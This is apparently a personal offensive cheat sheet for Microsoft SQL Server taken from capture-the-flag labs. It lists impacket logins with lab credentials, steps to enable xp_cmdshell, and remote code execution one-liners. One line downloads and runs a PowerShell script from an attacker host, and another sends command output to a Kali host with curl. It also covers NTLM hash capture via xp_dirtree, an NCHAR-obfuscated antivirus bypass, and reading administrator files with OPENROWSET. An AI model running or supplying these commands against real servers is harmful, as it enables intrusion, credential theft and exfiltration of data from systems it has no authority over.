
### mssql connect
```bash
# windows 계정으로 로그인할 경우
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.145.148 -windows-auth
# DB 계정으로 로그인할 경우
impacket-mssqlclient "streaio.htb/db_admin:B1@hx31234567890"@240.0.0.1

# 로컬에서 접근할 경우
.\sqlcmd.exe -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
```

### db enumeration

```sql
enum_db
```

### show tables

```sql
SELECT table_name FROM <db_name>.INFORMATION_SCHEMA.TABLES 
```

### db 전환

```sql
USE <database_name>;
```

### select tables

```sql
SELECT * from <table_name>
```

### db 내 user정의 table(u) 조회

```sql
SELECT name,id from <db_name>..sysobjects where xtype='u';
# 한번에 id:name 쌍을 출력해야할 경우
SELECT concat(id,":",name) from <db_name>..sysobjects where xtype='u';
# 여러줄을 | 구분자로 이어붙일 경우
SELECT string_agg(concat(name,':',id),'|') from <db_name>..sysobjects where xtype='u'
```

### db 내 column 이름 조회

```sql
# SELECT column name thru table id
SELECT string_agg(name,'|') from <db_name>..syscolumns where id=<id>
```

### Enable xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### xp_cmdshell

```powershell
# RCE thru ps1
exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;

# RCE thru curl
EXEC xp_cmdshell 'powershell -c "$x = whoami; curl <http://my-kali?output=$x>"';
```

### File Read, OOB (NTLM Hash)

```sql
EXEC xp_dirtree 'C:\\inetpub\\wwwroot\\',1,1;
```

### AV Bypass
```sql
DECLARE @sql NVARCHAR(100); SET @sql = NCHAR(120)+NCHAR(112)+NCHAR(95)+NCHAR(99)+NCHAR(109)+NCHAR(100)+NCHAR(115)+NCHAR(104)+NCHAR(101)+NCHAR(108)+NCHAR(108); EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure @sql, 1; RECONFIGURE; EXEC @sql 'ipconfig';
```

### SID
```sql
SELECT name, sid, type_desc FROM sys.server_principals;
SELECT SUSER_SID('SIGNED\mssqlsvc');
```

### File Read
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE;
SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt',SINGLE_CLOB) AS x;
```

### SYSADMIN
```sql
SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id = rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id WHERE r.name = 'sysadmin';
```
